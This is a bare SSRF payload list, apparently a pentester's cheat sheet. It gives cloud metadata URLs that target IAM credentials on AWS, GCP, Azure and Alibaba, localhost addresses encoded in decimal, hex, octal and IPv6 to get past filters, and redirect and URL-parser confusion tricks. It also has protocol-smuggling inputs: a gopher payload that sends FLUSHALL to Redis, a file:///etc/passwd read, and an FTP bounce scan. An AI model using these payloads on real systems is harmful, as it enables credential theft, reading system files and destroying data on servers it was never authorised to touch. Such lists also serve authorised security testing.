# SSRF payload bank

## Cloud metadata
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/{role}
http://169.254.169.254/latest/user-data
http://metadata.google.internal/computeMetadata/v1/ (GCP, header Metadata-Flavor: Google)
http://169.254.170.2/v2/credentials (AWS ECS)
http://100.100.100.200/latest/meta-data/ (Alibaba)
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure IMDS, header Metadata: true)

## IP encoding bypass
http://2130706433/ (decimal)
http://0x7f000001/ (hex)
http://0177.0.0.1/ (octal)
http://[::ffff:127.0.0.1]/ (IPv6 mapped)
http://localtest.me/ (resolves 127.0.0.1)
http://spoofed.burpcollaborator.net/ (DNS pinning)

## Redirect bypass
http://redirect-service/redir?url=http://169.254.169.254/
http://127.0.0.1#@169.254.169.254/ (parser confusion)
http://169.254.169.254:80@127.0.0.1/ (userinfo confusion)

## Protocol smuggling
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a (Redis RCE)
dict://127.0.0.1:6379/info
file:///etc/passwd
ftp://127.0.0.1:21/ (bounce scan)
